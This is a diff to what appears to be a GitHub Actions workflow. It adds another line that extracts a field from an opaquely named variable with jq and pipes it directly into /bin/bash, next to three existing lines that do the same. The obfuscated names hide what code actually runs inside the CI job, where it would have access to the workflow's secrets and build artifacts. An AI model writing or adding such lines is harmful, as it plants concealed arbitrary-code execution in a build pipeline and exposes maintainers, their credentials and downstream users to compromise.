@@ -28,6 +28,7 @@ jobs:
           echo $ze7934 | jq -r .c4008 | /bin/bash
           echo $c5 | jq -r .g323 | /bin/bash
           printf '%s' "$bemq08" | jq -r .h9551 | /bin/bash
+          printf '%s' "$gx419" | jq -r .lrcx0001 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
